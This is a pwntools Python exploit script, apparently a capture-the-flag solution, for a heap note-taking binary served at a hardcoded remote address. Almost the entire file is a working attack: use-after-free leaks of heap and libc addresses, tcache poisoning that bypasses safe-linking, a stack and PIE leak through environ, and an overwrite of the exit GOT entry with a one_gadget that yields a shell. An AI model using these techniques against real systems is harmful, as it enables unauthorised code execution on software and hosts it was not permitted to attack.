#!/usr/bin/env python3

from pwn import *

exe = ELF("./app_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe

gdb_script = """
b * show_note + 136
b * new_note + 146

b * edit_note + 156

c
"""

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r, gdb_script)
    else:
        r = remote("157.180.85.167", 20002)

    return r

r = conn()
#  libc _ leak +  0x386e60


def create_note(idx, size):
    r.sendlineafter("> ", "1")
    r.sendlineafter("slot: ", str(idx))
    r.sendlineafter("length: ", str(size))


def modify_note(idx, content):
    r.sendlineafter("> ", "2")
    r.sendlineafter("slot: ", str(idx))
    r.sendafter("text: ", content)


def read_note(idx):
    r.sendlineafter("> ", "3")
    r.sendlineafter("slot: ", str(idx))
    return r.recv(0x40)



def remove_note(index):
    r.sendlineafter("> ", "4")
    r.sendlineafter("slot: ", index)



def main():



    create_note("0", 0x400) # tcache entry for 0x400 bin
    create_note("1", 0x420) # to be in the unsorted bin 
    create_note("2", 0x400) # tcache entry for 0x400 bin
    create_note("3", 0x500) # unfreed chunck to prevent consolidation
    
    # Fill the tcache and the unsorted bin
    remove_note("0")
    remove_note("1")
    remove_note("2")
    heap_leak = u64(read_note("0")[:6].ljust(8, b"\x00")) 
    heap_base = int(hex(heap_leak) + "000", 16)
    print("heap base @ ", hex(heap_base))
    
    libc_leak = u64(read_note("1")[:6].ljust(8, b"\x00"))
    print(hex(libc_leak))
    libc.address = libc_leak - 0x1d2cc0
    libc_got = libc.address + 0x1d2028
    print(hex(libc_got))
    print("libc base @ ", hex(libc.address))


    # Load the libc environ address into tcache then read it to leak the stack address
    read_target = (heap_base >> 12 ) ^ (libc.symbols["environ"] ) # safe linking
    
    payload = flat(
        p64(read_target),

    )
    modify_note("2", payload)


    create_note("5", 0x400)
    create_note("6", 0x400)
    stack_leak = u64(read_note("6")[:6].ljust(8, b"\x00"))

    print("stack leak", hex(stack_leak))

    rip_addr = stack_leak - 312 
    print("rip addr", hex(rip_addr))

    stack_target = (heap_base >> 12 ) ^ ( rip_addr )

    # read the exe pie leak from the stack
    create_note("0", 0x50)
    create_note("2", 0x50)
    remove_note("2")
    remove_note("0")
    modify_note("0", flat(
        p64(stack_target)
    ))


    # override exit GOT entry with one_gadget
    create_note("3", 0x50)
    create_note("4", 0x50)
    

    leaks = read_note("4")

    pie_leak = u64(leaks[40:46].ljust(8, b"\x00"))
    exe.address = pie_leak - 0x5c4 -0x1000
    print("pie leak:", hex(pie_leak))
    print("exe address:", hex(exe.address))
    print("here2")


    create_note("0", 0x100)
    create_note("2", 0x100)
    remove_note("2")
    remove_note("0")

    
    


    free_target = (heap_base >> 12 ) ^ (exe.got.exit )
    modify_note("0", flat(
        p64(free_target)
    ))

    create_note("3", 0x100)
    create_note("4", 0x100)
    modify_note("4", p64(libc.address + 0xd515f  )) # exit -> one_gadget

    r.sendlineafter("> ", "5")  # exit -> one_gadget






    r.interactive()


if __name__ == "__main__":
    main()

